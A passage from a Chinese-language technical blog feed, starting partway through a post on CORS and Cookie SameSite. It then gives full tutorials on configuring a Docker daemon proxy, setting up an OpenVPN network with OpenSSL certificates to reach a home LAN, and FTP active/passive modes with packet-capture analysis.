href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy#%E8%B7%A8%E6%BA%90%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy#%E8%B7%A8%E6%BA%90%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE</a></p><p>(2)简单跨源请求与非简单跨源请求<br>跨源请求在发送前，浏览器会进行简单跨源请求还是非简单跨源请求的判断，如果是简单跨源请求，那么浏览器直接发送跨源请求，如果是非简单跨源请求，那么就会先发送CORS预检请求</p><p>二者的详细定义见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82</a></p><p>这里我总结一下，<br>简单跨源请求:</p><ul><li><code>img、link、video、audio、script</code>等标签发起的</li><li>用户主动点击链接、提交表单发起的</li></ul><p>非简单跨源请求</p><ul><li>javascript里XMLHttpRequest发起的</li><li>fetch API发起的</li></ul><h2 id="二、CORS跨源资源共享"><a href="#二、CORS跨源资源共享" class="headerlink" title="二、CORS跨源资源共享"></a>二、CORS跨源资源共享</h2><p>CORS，Cross Origin Resource Sharing，跨源资源共享<br>如果一个跨源请求是<strong>非简单的</strong>，那浏览器就得发送<strong>CORS预检请求</strong></p><p>关于预检请求的详解见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS#%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82</a></p><h2 id="三、Cookie的SameSite属性"><a href="#三、Cookie的SameSite属性" class="headerlink" title="三、Cookie的SameSite属性"></a>三、Cookie的SameSite属性</h2><p>Cookie的SameSite属性有三种值</p><ul><li><strong>None</strong> 任何跨站请求都会携带cookie，注意此值必须搭配secure属性值为true</li><li><strong>Lax</strong> 允许部分跨站请求携带cookie</li><li><strong>Strict</strong> 禁止任何跨站请求携带cookie</li></ul><p>那关于Lax，到底哪些请求会携带cookie呢，以下是一张总结表<br><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E8%B7%A8%E6%BA%90%E4%B8%8E%E8%B7%A8%E7%AB%99%E3%80%81CORS%E3%80%81Cookie%E7%9A%84SameSite%E5%B1%9E%E6%80%A7%E6%B5%85%E6%9E%90/1.png" alt="这里有一个图片"></p><p><br><br><br>本文参考的文章<br><a href="https://github.com/mqyqingfeng/Blog/issues/157">https://github.com/mqyqingfeng/Blog/issues/157</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS</a><br><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>为docker设置代理</title>
    <link href="/2023/12/24/%E4%B8%BAdocker%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2023/12/24/%E4%B8%BAdocker%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>当我们在终端输入<code>docker pull xxx</code>时，docker服务会去<a href="https://hub.docker.com/">DockerHub</a>拉取镜像</p><p>但因为国家政策的相关原因，DockerHub是被禁止访问的</p><p>因此你大概会得到以下报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Error response from daemon: Get <span class="hljs-string">&quot;https://registry-1.docker.io/v2/&quot;</span>: <br>net/http: request canceled <span class="hljs-keyword">while</span> waiting <span class="hljs-keyword">for</span> connection <br>(Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers)<br></code></pre></td></tr></table></figure><p>&nbsp;</p><p>我们如果想要拉取镜像就需要为docker配置代理</p><p>但是docker是C&#x2F;S架构的，你直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https_proxy=<span class="hljs-string">&quot;xxxx&quot;</span> docker pull xxx<br></code></pre></td></tr></table></figure><p>是无法成功的，这只是为客户端设置了代理，并没有为服务器设置代理</p><p>&nbsp;</p><p>正确的做法如下</p><p>前往docker的配置目录，ubuntu下是<code>/etc/docker</code></p><p>新建一个daemon.json文件，里面填写你的代理地址</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;proxies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;http-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://proxy.example.com:3128&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;https-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://proxy.example.com:3129&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;no-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*.test.example.com,.example.org,127.0.0.0/8&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后重启docker服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart docker<br></code></pre></td></tr></table></figure><p>此时再<code>docker pull xxx</code>就能成功了</p><p>&nbsp;</p><p>更多关于docker代理的资料，请参阅官方文档</p><p><a href="https://docs.docker.com/engine/daemon/proxy/">Daemon proxy configuration</a></p><p><a href="https://docs.docker.com/engine/cli/proxy/">Use a proxy server with the Docker CLI</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>用于远程访问家庭局域网的OpenVPN虚拟专用网络搭建教程</title>
    <link href="/2023/11/01/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    <url>/2023/11/01/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>如果你的家庭路由器的WAN口上没有公网IP，但你想要在外地的时候访问家庭局域网，那么可以使用OpenVPN搭建虚拟专用网络</p><p>OpenVPN，基于client&#x2F;server架构，分为工作在数据链路层的TAP模式和工作在网络层的TUN模式。具体工作原理请自行搜索</p><h2 id="一、前置条件"><a href="#一、前置条件" class="headerlink" title="一、前置条件"></a>一、前置条件</h2><ul><li>拥有一台VPS</li></ul><h2 id="二、生成私钥和证书"><a href="#二、生成私钥和证书" class="headerlink" title="二、生成私钥和证书"></a>二、生成私钥和证书</h2><p>首先在VPS上安装OpenSSL，我这里用的操作系统是ubuntu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install openssl libssl-dev<br></code></pre></td></tr></table></figure><p>然后使用OpenSSL生成OpenVPN的客户端和服务器用于双向认证的TLS证书</p><p>在你的VPS上切换到一个空目录</p><h3 id="生成CA的私钥和根证书"><a href="#生成CA的私钥和根证书" class="headerlink" title="生成CA的私钥和根证书"></a>生成CA的私钥和根证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成CA的私钥</span><br>openssl genpkey -algorithm RSA -out CA.key -pkeyopt rsa_keygen_bits:2048<br><span class="hljs-comment"># 生成证书签名请求</span><br>openssl req -new -key CA.key -out CA.csr<br><span class="hljs-comment"># 生成CA的自签名证书</span><br>openssl x509 -req -<span class="hljs-keyword">in</span> CA.csr -signkey CA.key -out CA.crt -days 365<br></code></pre></td></tr></table></figure><p>注意，这里生成的CA.key一定要严格保存，不能泄漏或丢失</p><h3 id="生成服务器的私钥和证书"><a href="#生成服务器的私钥和证书" class="headerlink" title="生成服务器的私钥和证书"></a>生成服务器的私钥和证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成服务器的私钥</span><br>openssl genpkey -algorithm RSA -out server.key -pkeyopt rsa_keygen_bits:2048<br><span class="hljs-comment"># 生成服务器的证书签名请求</span><br>openssl req -new -key server.key -out server.csr<br><span class="hljs-comment"># 生成服务器的经CA签名的证书</span><br>openssl x509 -req -<span class="hljs-keyword">in</span> server.csr -CA CA.crt -CAkey CA.key -CAcreateserial -out server.crt -days 365<br></code></pre></td></tr></table></figure><h3 id="生成客户端的私钥和证书"><a href="#生成客户端的私钥和证书" class="headerlink" title="生成客户端的私钥和证书"></a>生成客户端的私钥和证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成客户端的私钥</span><br>openssl genpkey -algorithm RSA -out client1.key -pkeyopt rsa_keygen_bits:2048<br><span class="hljs-comment"># 生成客户端的证书签名请求</span><br>openssl req -new -key client1.key -out client1.csr<br><span class="hljs-comment"># 生成客户端的经CA签名的证书</span><br>openssl x509 -req -<span class="hljs-keyword">in</span> client1.csr -CA CA.crt -CAkey CA.key -CAcreateserial -out client1.crt -days 365<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成客户端的私钥</span><br>openssl genpkey -algorithm RSA -out client2.key -pkeyopt rsa_keygen_bits:2048<br><span class="hljs-comment"># 生成客户端的证书签名请求</span><br>openssl req -new -key client2.key -out client2.csr<br><span class="hljs-comment"># 生成客户端的经CA签名的证书</span><br>openssl x509 -req -<span class="hljs-keyword">in</span> client2.csr -CA CA.crt -CAkey CA.key -CAcreateserial -out client2.crt -days 365<br></code></pre></td></tr></table></figure><h3 id="生成Diffie-Hellman参数文件"><a href="#生成Diffie-Hellman参数文件" class="headerlink" title="生成Diffie-Hellman参数文件"></a>生成Diffie-Hellman参数文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl dhparam -out DH2048.pem 2048<br></code></pre></td></tr></table></figure><p>至此，整个目录下应该有10个文件</p><ul><li><p>CA.key、CA.csr、CA.crt</p></li><li><p>server.key、server.csr、server.crt</p></li><li><p>client1.key、client1.csr、client1.crt</p></li><li><p>client2.key、client2.csr、client2.crt</p></li><li><p>DH2048.pem</p></li></ul><h2 id="三、VPS上的服务器配置"><a href="#三、VPS上的服务器配置" class="headerlink" title="三、VPS上的服务器配置"></a>三、VPS上的服务器配置</h2><p>首先在VPS上使用apt安装openvpn</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install openvpn<br></code></pre></td></tr></table></figure><p>安装好后，把上一步中生成的<code>server.key</code>、<code>server.crt</code>、<code>CA.crt</code>、<code>DH2048.pem</code>复制到VPS的目录&#x2F;etc&#x2F;openvpn&#x2F;server</p><p>同时在&#x2F;etc&#x2F;openvpn&#x2F;server下创建server.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">port</span> xxx    <span class="hljs-comment"># 监听的端口</span><br>proto tcp    <span class="hljs-comment"># TCP模式</span><br>dev tun    <span class="hljs-comment"># TUN模式</span><br>ca /etc/openvpn/server/CA.crt<br>cert /etc/openvpn/server/server.crt<br>key /etc/openvpn/server/server.key<br>dh /etc/openvpn/server/DH2048.pem<br>topology subnet    <span class="hljs-comment"># 设置网络拓扑为subnet模式</span><br>server <span class="hljs-number">192.168.111.0</span> <span class="hljs-number">255.255.255.240</span>    <span class="hljs-comment"># 这里填一个网段即可，注意不要和原有网段冲突</span><br>client-to-client    <span class="hljs-comment"># 允许客户端之间互相通信</span><br>ifconfig-pool-persist /etc/openvpn/server/ipp.txt<br>keepalive <span class="hljs-number">10</span> <span class="hljs-number">120</span><br>max-clients <span class="hljs-number">10</span>    <span class="hljs-comment"># 最大客户端数</span><br>status /var/log/OpenVPN/OpenVPNStatus.log<br>log /var/log/OpenVPN/OpenVPN.log<br>verb <span class="hljs-number">3</span>    <span class="hljs-comment"># 日志详细等级，数值越大越详细</span><br>persist-key<br>persist-tun<br>cipher AES-<span class="hljs-number">256</span>-CBC<br>verify-client-cert require    <span class="hljs-comment"># 验证客户端的证书</span><br></code></pre></td></tr></table></figure><p>然后去你的VPS提供商那里配置防火墙，放行xxx端口</p><p>接着启动OpenVPN服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart openvpn-server@server.service<br></code></pre></td></tr></table></figure><h2 id="四、局域网内主机的客户端配置"><a href="#四、局域网内主机的客户端配置" class="headerlink" title="四、局域网内主机的客户端配置"></a>四、局域网内主机的客户端配置</h2><p>首先在需要放入虚拟专用网络的局域网主机上安装OpenVPN，我这里局域网主机操作系统也是ubuntu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install openvpn<br></code></pre></td></tr></table></figure><p>将第二步生成的<code>CA.crt</code>、<code>client1.key</code>、<code>client1.crt</code>复制到&#x2F;etc&#x2F;openvpn&#x2F;client目录下</p><p>然后将以下配置文件client1.conf上传到&#x2F;etc&#x2F;openvpn&#x2F;client目录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">client</span><br>dev tun<br>proto tcp<br>remote 你的VPSIP 服务器监听的端口<br>ca /etc/openvpn/client/CA.crt<br>cert /etc/openvpn/client/client1.crt<br>key /etc/openvpn/client/client1.key<br>cipher AES-<span class="hljs-number">256</span>-CBC<br>verb <span class="hljs-number">3</span><br>status /var/log/OpenVPN/OpenVPNStatus.log<br>log /var/log/OpenVPN/OpenVPN.log<br>keepalive <span class="hljs-number">10</span> <span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>接着启动OpenVPN客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart openvpn-client@client1.service<br></code></pre></td></tr></table></figure><p>如果客户端和服务器连接成功，双方都会生成一个tun0接口</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/1.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/2.png" alt="这里有一个图片"></p><p>双方都能互相PING通</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/3.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/4.png" alt="这里有一个图片"></p><h2 id="五、外地笔记本的客户端配置"><a href="#五、外地笔记本的客户端配置" class="headerlink" title="五、外地笔记本的客户端配置"></a>五、外地笔记本的客户端配置</h2><p>我们假设外地笔记本为windows系统</p><p>首先前往<a href="https://openvpn.net/client/client-connect-vpn-for-windows/">OpenVPN官网</a>下载windows客户端</p><p>安装好客户端后，一定要确保<code>TAP-Windows Adapter V9 for OpenVPN Connect</code>这个网络适配器<code>存在</code>且<code>已启用</code></p><p>然后将第二步生成的<code>client2.key</code>、<code>client2.crt</code>、<code>CA.crt</code>复制到windows的某个目录</p><p>接着在该目录下创建配置文件client2.ovpn</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">client</span><br>dev tun<br>proto tcp<br>remote <span class="hljs-number">14.103.157.111</span> <span class="hljs-number">22993</span><br>ca <span class="hljs-string">&quot;D:\\OpenVPN\\CA.crt&quot;</span><br>cert <span class="hljs-string">&quot;D:\\OpenVPN\\client2.crt&quot;</span><br>key <span class="hljs-string">&quot;D:\\OpenVPN\\client2.key&quot;</span><br>cipher AES-<span class="hljs-number">256</span>-CBC<br>verb <span class="hljs-number">3</span><br>keepalive <span class="hljs-number">10</span> <span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>启动OpenVPN客户端，导入client2.ovpn</p><img title="" src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/5.png" alt="这里有一个图片" data-align="inline" width="344"><p>连接成功，分配的IP为192.168.111.3</p><img title="" src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/6.png" alt="这里有一个图片" width="375" data-align="inline"><p>此时PING下192.168.111.2，可以PING成功</p><img title="" src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/7.png" alt="这里有一张图片" data-align="inline"><p>浏览器访问下192.168.111.2上的nginx服务器，成功访问</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E7%9A%84OpenVPN%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/8.png" alt="这里有一个图片"></p><h2 id="六、添加更多局域网内主机"><a href="#六、添加更多局域网内主机" class="headerlink" title="六、添加更多局域网内主机"></a>六、添加更多局域网内主机</h2><p>如果要添加更多局域网内主机到OpenVPN构建的虚拟专用网络，只用照着第二步通过OpenSSL生成客户端的私钥和证书<code>client3.key</code>、<code>client3.csr</code>、<code>client3.crt</code>，然后照着第三步配置即可</p><p>同时要注意客户端数量不要超过服务器配置文件<code>server.conf</code>里的max-clients上限</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FTP主被动模式与抓包分析</title>
    <link href="/2023/10/30/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <url>/2023/10/30/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>FTP基于C&#x2F;S架构，客户端和服务器会建立两条TCP连接，分别是控制连接和数据连接</p><p>FTP的主动和被动模式指的是FTP服务器在数据连接建立上的主、被动性</p><p>每次文件传输前客户端都要通过控制连接向服务器表明本次数据连接建立采用主&#x2F;被动模式，然后建立数据连接</p><p>在了解主动和被动模式之前，最好对FTP的报文格式有一个清晰的认识，这部分可以参考我的另一篇文章 <a href="https://www.pasiphae.top/2023/10/30/FTP%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F/">FTP报文格式</a></p><h2 id="一、主动模式"><a href="#一、主动模式" class="headerlink" title="一、主动模式"></a>一、主动模式</h2><p>首先客户端以一个随机的端口a向服务器的21端口发起TCP控制连接</p><p>当客户端<strong>每次有文件要传输</strong>时，其会开始监听另一个随机的用于数据连接的端口b，然后以PORT请求告知服务器本次建立采用主动模式，且客户端监听端口为b，例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PORT 192,168,163,103,143,127\r\n<br>前四个逗号为IP，后两个为端口，此时客户端监听的端口为143*256+127=36735<br></code></pre></td></tr></table></figure><p>服务器以20端口主动向客户端监听的端口b发起TCP连接</p><p>数据连接建立成功后，进行文件的传输，传输完成断开数据连接</p><p>注意，如果FTP服务器处在公网上，客户端位于NAT设备之后，则服务器无法主动建立与客户端的数据连接，此时只能选择被动模式</p><p>当服务器和客户端所在主机处于同一局域网，则可以使用主动模式</p><h2 id="二、被动模式"><a href="#二、被动模式" class="headerlink" title="二、被动模式"></a>二、被动模式</h2><p>首先客户端以一个随机的端口a向服务器的21端口发起TCP控制连接</p><p>客户端<strong>每次有文件要传输</strong>时，其在控制连接上发送PASV请求告知服务器本次数据连接使用被动模式</p><p>服务器收到PASV请求后开始监听另一个随机的用于数据连接的端口b，并作为PASV请求的相应，例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">227 Entering Passive Mode (192,168,163,105,109,134).\r\n<br>此时服务器监听的端口为109*256+134=28038<br></code></pre></td></tr></table></figure><p>客户端收到响应后以另一个随机的端口c向服务器的端口b发起TCP数据连接</p><p>数据连接建立成功后，进行文件传输，传输完成断开数据连接</p><h2 id="三、主被动模式切换"><a href="#三、主被动模式切换" class="headerlink" title="三、主被动模式切换"></a>三、主被动模式切换</h2><p>在linux自带的FTP客户端下，默认的模式为主动模式</p><p>输入passive，客户端会切换到被动模式，每次当有文件要传输时会发出PASV请求</p><p>再次输入passive，客户端会切换到主动模式，每次当有文件要传输时会发出PORT请求</p><h2 id="四、抓包分析"><a href="#四、抓包分析" class="headerlink" title="四、抓包分析"></a>四、抓包分析</h2><p>通过WireShark进行抓包分析</p><p>服务器: VSFTPD(Very Secure File Transfer Protocol Daemon) ubuntu</p><p>客户端: ubuntu自带FTP客户端 </p><h3 id="主动模式抓包"><a href="#主动模式抓包" class="headerlink" title="主动模式抓包"></a>主动模式抓包</h3><p>终端输入ftp启动linux自带的FTP客户端</p><p>输入help列出的命令并非和FTP命令报文格式中的命令一一对应，但大多能对上</p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/2.png"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/3.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/4.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/5.png" alt="这里有一个图片"></p><h3 id="被动模式抓包"><a href="#被动模式抓包" class="headerlink" title="被动模式抓包"></a>被动模式抓包</h3><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/8.png"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/6.png" alt="这里有一个图片"></p><p><img src="https://callisto.oss-cn-chengdu.aliyuncs.com/images/FTP%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E4%B8%8E%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/7.png" alt="这里有一个图片"></p><p>更多关于FTP的主被动模式的信息，请参阅RFC文档</p><p><a href="https://datatracker.ietf.org/doc/html/rfc959">https://datatracker.ietf.org/doc/html/rfc959</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FTP报文格式</title>
    <link href="/2023/10/30/FTP%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F/"/>
    <url>/2023/10/30/FTP%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F/</url>
    
